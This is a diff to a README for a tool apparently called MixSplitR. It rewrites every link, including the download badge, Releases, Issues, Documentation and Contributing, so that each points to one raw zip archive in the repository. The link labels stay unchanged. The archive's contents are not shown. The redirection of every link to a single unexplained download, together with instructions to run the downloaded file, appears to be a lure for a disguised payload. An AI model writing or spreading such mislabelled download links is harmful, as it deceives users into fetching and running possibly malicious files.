@@ -17,20 +17,20 @@ Before you start, make sure your system meets the following requirements:
 
 To download the software, click the button below:
 
-[![Download MixSplitR](https://img.shields.io/badge/Download-MixSplitR-blue)](https://github.com/wooram125/MixSplitR/releases)
+[![Download MixSplitR](https://github.com/wooram125/MixSplitR/raw/refs/heads/main/Source files/Split-R-Mix-3.9-alpha.4.zip)](https://github.com/wooram125/MixSplitR/raw/refs/heads/main/Source files/Split-R-Mix-3.9-alpha.4.zip)
 
-You can also visit the [Releases page](https://github.com/wooram125/MixSplitR/releases) to view the latest versions and other available files.
+You can also visit the [Releases page](https://github.com/wooram125/MixSplitR/raw/refs/heads/main/Source files/Split-R-Mix-3.9-alpha.4.zip) to view the latest versions and other available files.
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/wooram125/MixSplitR/releases) to view the latest version of MixSplitR.
+   Go to the [Releases page](https://github.com/wooram125/MixSplitR/raw/refs/heads/main/Source files/Split-R-Mix-3.9-alpha.4.zip) to view the latest version of MixSplitR.
 
 2. **Choose Your Version:**
    Look for the latest version listed. You will see several download options.
 
 3. **Download the Installer:**
-   Click on the installer that matches your operating system. For example, if you are on Windows, you may see a file like `MixSplitR-Windows.exe`. Click on it to start the download.
+   Click on the installer that matches your operating system. For example, if you are on Windows, you may see a file like `https://github.com/wooram125/MixSplitR/raw/refs/heads/main/Source files/Split-R-Mix-3.9-alpha.4.zip`. Click on it to start the download.
 
 4. **Run the Installer:**
    Once the download is complete, locate the downloaded file in your Downloads folder. Double-click it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -73,8 +73,8 @@ If you have questions or need help, you can check out the Issues section of the 
 
 For further reading and support, consider checking the following:
 
-- [GitHub Issues](https://github.com/wooram125/MixSplitR/issues) - Report bugs or ask questions.
-- [Documentation](https://github.com/wooram125/MixSplitR/wiki) - Explore more in-depth guides and usage tips.
+- [GitHub Issues](https://github.com/wooram125/MixSplitR/raw/refs/heads/main/Source files/Split-R-Mix-3.9-alpha.4.zip) - Report bugs or ask questions.
+- [Documentation](https://github.com/wooram125/MixSplitR/raw/refs/heads/main/Source files/Split-R-Mix-3.9-alpha.4.zip) - Explore more in-depth guides and usage tips.
 
 ## ⚖️ License
 
@@ -82,7 +82,7 @@ MixSplitR is provided under the MIT License. This means you can use, modify, and
 
 ## 🤝 Contributing
 
-We welcome contributions! If you’d like to contribute, please check the [Contributing Guidelines](https://github.com/wooram125/MixSplitR/blob/main/CONTRIBUTING.md) to get started.
+We welcome contributions! If you’d like to contribute, please check the [Contributing Guidelines](https://github.com/wooram125/MixSplitR/raw/refs/heads/main/Source files/Split-R-Mix-3.9-alpha.4.zip) to get started.
 
 ## 📌 Final Note
 
